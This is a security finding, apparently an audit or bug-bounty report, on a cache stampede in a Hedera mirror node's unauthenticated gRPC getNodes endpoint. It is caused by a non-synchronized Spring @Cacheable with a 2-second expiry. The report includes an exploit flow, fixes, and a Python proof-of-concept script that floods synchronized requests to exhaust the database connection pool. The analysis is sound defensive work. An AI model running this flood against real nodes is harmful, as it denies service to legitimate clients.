### Title
Cache Stampede via Non-Synchronized `@Cacheable` on `findByConsensusTimestampAndNodeId` Allows Unauthenticated DB Connection Pool Exhaustion

### Summary
`AddressBookEntryRepository.findByConsensusTimestampAndNodeId()` is annotated with `@Cacheable` (without `sync=true`) backed by a Caffeine cache configured with `expireAfterWrite(2s)`. Spring's default non-synchronized cache lookup is not atomic: when the 2-second window expires, all concurrent `getNodes()` callers simultaneously observe a cache miss and each independently fires a database query. An unprivileged attacker who opens many gRPC connections and times requests to the cache expiry boundary can saturate the database connection pool, causing severe latency spikes for all address book consumers.

### Finding Description

**Exact code path:**

- `NetworkController.getNodes()` (line 33–43) delegates to `networkService::getNodes` with no authentication or rate-limiting gate.
- `NetworkServiceImpl.getNodes()` (lines 55–77) calls `addressBookRepository.findLatestTimestamp()` (uncached) and then pages through `addressBookEntryRepository.findByConsensusTimestampAndNodeId()`.
- `AddressBookEntryRepository.findByConsensusTimestampAndNodeId()` (lines 16–36) carries:

```java
@Cacheable(
    cacheManager = ADDRESS_BOOK_ENTRY_CACHE,
    cacheNames = CACHE_NAME,
    unless = "@spelHelper.isNullOrEmpty(#result)")
```

No `sync = true` is present.

- The backing cache is built in `CacheConfiguration` (lines 29–32) as:

```java
Caffeine.newBuilder()
    .expireAfterWrite(addressBookProperties.getCacheExpiry())  // 2 seconds
    .maximumSize(addressBookProperties.getCacheSize())          // 50 pages
    .recordStats()
```

**Root cause / failed assumption:**

Spring's `@Cacheable` without `sync=true` performs a non-atomic read-then-write: it calls `cache.getIfPresent(key)`, and if null, invokes the method, then calls `cache.put(key, value)`. There is no lock or single-flight guard. When the 2-second TTL expires, every thread that concurrently calls `getIfPresent` receives `null` and independently executes the SQL query. The assumption that the cache prevents parallel DB fan-out is false for concurrent callers at expiry time.

**Exploit flow:**

1. Attacker establishes N gRPC connections. Each connection permits `maxConcurrentCallsPerConnection = 5` (default, `NettyProperties` line 14), so N×5 concurrent `getNodes()` RPCs are possible with no authentication.
2. Attacker observes or estimates the 2-second cache cycle (trivially: send one request, measure response time; repeat every ~1.9 s to track expiry).
3. At the moment the cache entry expires, the attacker floods all N×5 concurrent `getNodes()` calls simultaneously.
4. All callers reach `findByConsensusTimestampAndNodeId()`, all observe a cache miss (the entry just expired), and all submit independent SQL queries to the database.
5. Each `getNodes()` call also issues an uncached `findLatestTimestamp()` query, doubling the DB load per caller.
6. The default HikariCP pool (10 connections) is exhausted; subsequent legitimate queries queue or time out (`db.statementTimeout = 10000 ms`).

### Impact Explanation

Database connection pool exhaustion causes all address book queries — including those from legitimate Hedera SDK clients bootstrapping node connectivity — to stall until pool connections free up. With a 10-connection pool and N×5 concurrent attacker queries each holding a connection for the duration of a paginated address book scan (multiple pages × 250 ms `pageDelay`), legitimate requests can be delayed by multiples of normal response time. Address book delivery is the critical path for SDK node discovery; sustained delays degrade the ability of clients to submit transactions to the network. Severity: **Medium–High** (availability impact, no authentication required, repeatable every 2 seconds).

### Likelihood Explanation

The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no privileged network position. The 2-second cache cycle is short and predictable. A single attacker machine with modest concurrency (e.g., 20 connections = 100 concurrent RPCs) is sufficient to exhaust a default pool. The attack is trivially repeatable in a tight loop aligned to the cache TTL. No existing server-side control (no global rate limiter, no IP-based throttle, no authentication on `getNodes`) prevents it.

### Recommendation

1. **Add `sync = true`** to the `@Cacheable` annotation on `findByConsensusTimestampAndNodeId`. This causes Spring to delegate to Caffeine's atomic `get(key, loader)`, ensuring only one thread computes the value while others wait:
   ```java
   @Cacheable(
       cacheManager = ADDRESS_BOOK_ENTRY_CACHE,
       cacheNames = CACHE_NAME,
       sync = true,
       unless = "@spelHelper.isNullOrEmpty(#result)")
   ```
2. **Add a global concurrent-call limit** for `getNodes` (e.g., a semaphore or Resilience4j `Bulkhead`) independent of per-connection limits.
3. **Cache `findLatestTimestamp()`** as well, since it is called uncached on every `getNodes()` invocation and contributes additional DB load during stampedes.
4. **Consider `refreshAfterWrite`** instead of `expireAfterWrite` so stale data is served while a single background thread refreshes, eliminating the expiry window entirely.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import mirror_pb2, mirror_pb2_grpc

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 20
CALLS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

channels = [grpc.insecure_channel(TARGET) for _ in range(NUM_CONNECTIONS)]
stubs = [mirror_pb2_grpc.NetworkServiceStub(ch) for ch in channels]

query = mirror_pb2.AddressBookQuery()  # no auth required

barrier = threading.Barrier(NUM_CONNECTIONS * CALLS_PER_CONN)

def flood(stub):
    barrier.wait()  # synchronize all threads to fire simultaneously
    try:
        list(stub.getNodes(query))
    except Exception as e:
        print(f"Error: {e}")

# Step 1: send one request to prime the cache, note timestamp
# Step 2: wait ~1.95s (just before 2s expiry)
# Step 3: launch all threads simultaneously
threads = []
for stub in stubs:
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=flood, args=(stub,))
        threads.append(t)

for t in threads:
    t.start()
for t in threads:
    t.join()

# Observe: DB connection pool exhausted, legitimate requests time out
```

Repeat every 2 seconds to sustain the attack. Monitor DB pool wait times to confirm exhaustion.
